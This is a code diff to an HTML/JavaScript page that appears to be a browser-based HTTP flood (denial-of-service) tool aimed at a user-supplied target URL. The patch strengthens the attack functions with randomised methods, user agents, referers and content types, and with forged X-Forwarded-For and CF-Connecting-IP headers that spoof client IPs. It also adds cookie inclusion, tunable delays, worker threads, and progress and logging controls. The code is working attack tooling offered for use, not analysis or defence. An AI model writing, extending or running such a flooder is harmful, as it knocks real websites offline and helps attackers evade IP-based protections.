-                        log(`Worker ${data.workerId}: Request #${data.count} succeeded`, 'success');
+                        log(`Worker ${data.workerId}: ${data.method} request #${data.count} succeeded (HTTP ${data.status})`, 'success');
                     } else if (data.type === 'error') {
-                        log(`Worker ${data.workerId}: Request failed - ${data.message}`, 'error');
+                        log(`Worker ${data.workerId}: ${data.method} request failed - ${data.message}`, 'error');
                     }
                 };
 
                 worker.postMessage({
                     command: 'start',
-                    url: url
+                    url: url,
+                    method: method,
+                    useCookies: useCookies,
+                    useReferers: useReferers,
+                    delay: delay
                 });
 
                 workers.push(worker);
@@ -492,9 +1059,10 @@
             setTimeout(() => {
                 if (isRunning) {
                     stopAttack();
-                    log(`Attack completed after ${duration} seconds`);
+                    log(`Attack completed after ${duration} seconds`, 'success');
                     statusDiv.className = 'success';
-                    statusDiv.textContent = `COMPLETED | TOTAL REQUESTS: ${requestCount}`;
+                    statusDiv.textContent = `COMPLETED | TOTAL REQUESTS: ${requestCount.toLocaleString()}`;
+                    statusDiv.classList.remove('pulse');
                 }
             }, duration * 1000);
         }
@@ -503,31 +1071,37 @@
         function startSimpleAttack(url, duration) {
             startTime = Date.now();
             lastUpdateTime = startTime;
+            attackDuration = duration;
             isRunning = true;
             startBtn.disabled = true;
             stopBtn.disabled = false;
+            progressContainer.classList.remove('hidden');
+            progressBar.style.width = '0%';
             
-            log(`Starting simple attack for ${duration} seconds`);
+            log(`Starting simple attack for ${duration} seconds`, 'warning');
 
             const attackInterval = setInterval(() => {
-                const method = getRandomMethod();
+                const method = getRandomMethod(methodSelect.value);
                 const rand = randomString(10);
                 const ip = randomIP();
                 
                 const headers = {
                     'User-Agent': randomUserAgent(),
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                    'Accept': getRandomAcceptHeader(),
                     'Upgrade-Insecure-Requests': '1',
-                    'Origin': \`http://\${rand}.com\`,
-                    'Referer': \`http://google.com/\${rand}\`,
                     'X-Forwarded-For': ip,
                     'CF-Connecting-IP': ip
                 };
 
+                if (enableReferers.checked) {
+                    headers['Origin'] = `http://${rand}.com`;
+                    headers['Referer'] = getRandomReferer();
+                }
+
                 let body = null;
-                if (method === 'POST' || method === 'PUT') {
-                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
-                    body = \`param1=\${randomString(5)}&param2=\${randomString(8)}\`;
+                if (method === 'POST' || method === 'PUT' || method === 'PATCH') {
+                    headers['Content-Type'] = getRandomContentType();
+                    body = `param1=${randomString(5)}&param2=${randomString(8)}`;
                 }
 
                 requestCount++;
@@ -538,28 +1112,30 @@
                     headers: headers,
                     body: body,
                     mode: 'no-cors',
-                    cache: 'no-store'
+                    cache: 'no-store',
+                    credentials: enableCookies.checked ? 'include' : 'omit'
                 })
                 .then(response => {
                     successCount++;
                     updateStatus();
-                    log(`Request #${requestCount} succeeded (${method})`, 'success');
+                    log(`Request #${requestCount} succeeded (${method} - HTTP ${response.status})`, 'success');
                 })
                 .catch(error => {
                     errorCount++;
                     updateStatus();
                     log(`Request #${requestCount} failed: ${error.message}`, 'error');
                 });
-            }, 100);
+            }, delayInput.value || 100);
 
             // Stop after duration
             setTimeout(() => {
                 if (isRunning) {
                     clearInterval(attackInterval);
                     stopAttack();
-                    log(`Attack completed after ${duration} seconds`);
+                    log(`Attack completed after ${duration} seconds`, 'success');
                     statusDiv.className = 'success';
-                    statusDiv.textContent = `COMPLETED | TOTAL REQUESTS: ${requestCount}`;
+                    statusDiv.textContent = `COMPLETED | TOTAL REQUESTS: ${requestCount.toLocaleString()}`;
+                    statusDiv.classList.remove('pulse');
                 }
             }, duration * 1000);
         }
@@ -568,6 +1144,7 @@
             isRunning = false;
             startBtn.disabled = false;
             stopBtn.disabled = true;
+            statusDiv.classList.remove('pulse');
             
             // Terminate all workers
             workers.forEach(worker => {
@@ -581,6 +1158,16 @@
         startBtn.addEventListener('click', () => {
             if (!urlInput.value) {
                 log('Please enter a target URL', 'error');
+                urlInput.focus();
+                return;
+            }
+
+            // Validate URL format
+            try {
+                new URL(urlInput.value);
+            } catch (e) {
+                log('Invalid URL format. Please include http:// or https://', 'error');
+                urlInput.focus();
                 return;
             }
 
@@ -588,12 +1175,28 @@
             requestCount = 0;
             successCount = 0;
             errorCount = 0;
+            consoleLines = 0;
+            consoleLineCount.textContent = '0';
             updateStatus();
             
-            startEnhancedAttack(urlInput.value, duration);
+            startEnhancedAttack(
+                urlInput.value, 
+                duration,
+                intensitySelect.value,
+                methodSelect.value,
+                parseInt(delayInput.value) || 100,
+                enableCookies.checked,
+                enableReferers.checked
+            );
         });
 
         stopBtn.addEventListener('click', stopAttack);
+
+        clearConsoleBtn.addEventListener('click', () => {
+            consoleDiv.innerHTML = '';
+            consoleLines = 0;
+            consoleLineCount.textContent = '0';
+        });
 
         // Error handling
         window.addEventListener('error', (event) => {
@@ -603,6 +1206,9 @@
         window.addEventListener('unhandledrejection', (event) => {
             log(`Unhandled rejection: ${event.reason}`, 'error');
         });
+
+        // Update progress bar periodically
+        setInterval(updateProgressBar, 1000);
     </script>
 </body>
 </html>
